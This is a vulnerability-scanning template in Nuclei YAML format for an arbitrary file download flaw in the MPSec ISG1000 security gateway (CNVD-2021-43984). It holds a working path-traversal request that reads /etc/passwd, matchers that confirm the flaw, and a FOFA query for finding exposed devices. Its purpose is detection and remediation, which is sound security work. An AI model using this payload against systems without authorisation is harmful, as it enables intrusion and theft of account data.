id: CNVD-2021-43984

info:
  name: MPSec ISG1000 安全网关任意文件下载漏洞（CNVD-2021-43984）
  author: DhiyaneshDk
  severity: high
  description: |
    MPSec ISG1000 安全网关的诊断数据下载接口存在任意文件读取风险。模板请求 `/webui/?g=sys_dia_data_down&file_name=../etc/passwd`，通过明文响应、会话头和账号文件特征确认漏洞。
  impact: |
    - 攻击者可读取网关设备系统文件和配置，获取账号、网络配置或敏感路径信息。
    - 安全网关被进一步利用后，可能影响边界访问控制、流量转发和内网防护能力。
  remediation: |
    - 升级 MPSec ISG1000 固件或应用厂商补丁，修复诊断文件下载接口。
    - 限制网关 Web 管理页面仅可信管理网段访问。
    - 检查设备账号、配置导出记录和异常访问日志，必要时轮换管理凭据。
  reference:
    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-43984
    - https://github.com/chaitin/xray/blob/master/pocs/mpsec-isg1000-file-read.yml
  metadata:
    verified: true
    max-request: 1
    fofa-query: "迈普通信技术股份有限公司"
  tags: cnvd2021,cnvd,mpsec,maipu,lfi,isg,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: word
        part: header
        words:
          - "text/plain"
          - "USGSESSID="
        condition: and

      - type: status
        status:
          - 200
